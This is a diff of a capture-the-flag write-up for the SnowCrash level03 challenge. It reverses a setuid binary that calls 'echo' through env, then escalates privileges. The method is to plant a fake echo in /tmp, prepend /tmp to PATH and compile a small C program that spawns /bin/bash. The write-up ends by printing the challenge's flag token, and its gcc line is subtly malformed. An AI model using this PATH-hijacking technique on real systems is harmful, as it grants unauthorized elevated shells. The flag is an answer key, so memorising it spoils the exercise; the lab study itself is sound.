@@ -8,10 +8,24 @@ Exploit me
 =============================================================
 # Let's try to reverse the binary, i get it from the VM
 	with my getfile script getfile.sh level03 /home/user/level03/level03
-	Once downloaded, i open the file in Ghidra (in my VM) (ghidra.png).
+	Once downloaded, i open the file in Ghidra (in my VM) (ghidra.png)
 [...]
 system("/usr/bin/env echo Exploit me");
 [..]
+
+# When reversing the flag03 binary, i see calls to
+	getegid, setresgid
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
+   0x080484f2 <+78>:	call   0x8048380 <setresuid@plt>
+
+# Let's check who is the owner of the file
+level03@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+
+# Our program is running as flag03 user, interesting...
 =============================================================
 # When seeing this, the first idea that comes in my mind is
 	to exploit the env variables
@@ -24,9 +38,41 @@ BASH_FUNC_echo%%=() {  ls  }
 [...]
 $ echo
 level03
+
 # But it does not work, the env command make those variables useless
 $ env echo salut
 salut
 =============================================================
 # This being useless, i'll try to work around the PATH variable
+	i have to create my own echo somewhere in order to call
+	another function
+	I must find a folder with wx permissions
+level03@SnowCrash:~$ ls -l /
+total 2
+[...]
+d-wx-wx-wx  4 root root   80 Aug  1 10:20 tmp
+[...]
+=============================================================
+# I'll be able to create my fake echo in /tmp
+level03@SnowCrash:~$ cat /bin/bash > /tmp/echo
+chmod +x /tmp/echo
 
+# My fake echo is created, i now modify the env variable
+	to prioritize the /tmp folder instead of /bin etc...
+export PATH="/tmp:$PATH"
+level03@SnowCrash:~$ ./level03
+echo: Exploit: Permission denied
+=============================================================
+# Ooops, looks like bash doesn't work due to args, let's
+	compile my own binary
+#include <stdlib.h>
+void main(void) {system("/bin/bash");}
+
+$ gcc -m32 /tmp/echo /tmp/echo.c
+============================================================
+level03@SnowCrash:~$ ./level03
+bash-4.2$ whoami
+flag03
+
+bash-4.2$ getflag
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
